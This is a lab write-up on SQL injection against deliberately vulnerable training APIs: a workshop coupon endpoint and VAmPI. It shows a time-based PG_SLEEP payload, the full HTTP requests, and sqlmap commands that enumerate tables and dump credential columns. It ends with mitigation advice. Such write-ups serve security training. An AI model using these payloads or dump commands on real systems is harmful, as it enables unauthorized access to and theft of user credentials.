# SQL Injection

## Definition
SQL Injection is a vulnerability that occurs when user-supplied input is directly incorporated into SQL queries without proper validation or parameterization. This allows attackers to manipulate database queries, leading to unauthorized data access, modification, or extraction.

---

## Lab 1 — Coupon Endpoint

### Target Endpoint
```
http://192.168.1.28:8888/workshop/api/shop/apply_coupon
```

### Normal Request
```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test","amount":"75"}
```

### Testing for Injection
```http
{"coupon_code":"' --","amount":"75"}
```

### Time-Based SQL Injection — Malicious Request
```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test';SELECT PG_SLEEP(5)--","amount":75}
```

### Vulnerability Description
The `coupon_code` parameter is vulnerable to SQL Injection. The payload:
```sql
test';SELECT PG_SLEEP(5)--
```
breaks the original query and injects a new SQL statement. The use of `PG_SLEEP(5)` introduces a delay, confirming the injection point through a time-based technique.

**Example vulnerable query:**
```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
```

**Becomes:**
```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
SELECT PG_SLEEP(5)--';
```

Confirmed in Burp Suite Repeater — sending the payload via `Authorization: Bearer <JWT>` against `http://192.168.1.5:8888/workshop/api/shop/apply_coupon` triggered the expected delay, validating the injection point.

### Impact
- Unauthorized database access
- Extraction of sensitive data (users, credentials)
- Authentication bypass
- Database enumeration
- Potential full system compromise depending on privileges

---

## Exploitation Using sqlmap

### Step 1: Save Request
Save the HTTP request into a file:
```
sqli-test.txt
```

### Step 2: Database Enumeration
```bash
sqlmap -r sqli-test.txt -p coupon_code --dbs
```

### Step 3: List Tables
```bash
sqlmap -r sqli-test.txt -p coupon_code -D public --tables
```

### Step 4: List Columns
```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T user_login --columns
```

### Step 5: Dump Sensitive Data
```bash
sqlmap -r sqli-test.txt -p coupon_code -T user_login -D public -C id,email,password,role --dump
```

### Additional Enumeration
```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_permission --dump
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group --dump
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group_permissions --dump
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_user_user_permissions --dump
```

### Advanced sqlmap Usage
```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group_permissions --dump --level=5 --risk=3 --threads=10 --dbms=PostgreSQL --technique=US

sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_user_user_permissions --dump --level=5 --risk=3 --threads=10 --dbms=PostgreSQL --technique=US
```

### Detection Techniques
- Inject special characters such as `'`, `"`, `;`
- Use time-based payloads (`PG_SLEEP`, `SLEEP`)
- Observe:
  - Response delays
  - Error messages
  - Changes in application behavior

---

## Lab 2 — VAmPI Lab (SQL Injection)

### Setup
Repository:
```
https://github.com/erev0s/VAmPI
```

Run using Docker:
```bash
docker run -p 5000:5000 erev0s/vampi:latest
```

### Target Endpoint
```
http://192.168.1.28:5000/users/v1/name1
```

### Request
```http
GET /users/v1/name1 HTTP/1.1
Host: 192.168.1.28:5000
Accept: application/json
```

### Vulnerability
The `name` path parameter is vulnerable to SQL Injection in the underlying SQLite query.

### List Columns
```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T users --columns
```

### Dump User Data
```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T users -C id,email,username,password,admin --dump
```

### Dump Additional Tables
```bash
sqlmap -u http://192.168.1.28:5000/users/v1/*name1* -D SQLite -T books --dump
```

### Impact
- Full database extraction
- Exposure of user credentials
- Privilege escalation (admin field)
- Access to sensitive application data

---

## Mitigation Strategies

### Parameterized Queries
- Use prepared statements
- Avoid dynamic query construction

### Input Validation
- Validate and sanitize all user inputs
- Enforce strict data types

### ORM Usage
- Use secure ORM frameworks that prevent raw query injection

### Least Privilege
- Restrict database user permissions
- Avoid using admin-level database accounts

### Error Handling
- Do not expose database errors to users

---

## Key Takeaway
SQL Injection remains one of the most critical vulnerabilities because it allows direct interaction with the database. Even a single vulnerable parameter can lead to full database compromise if not properly secured.
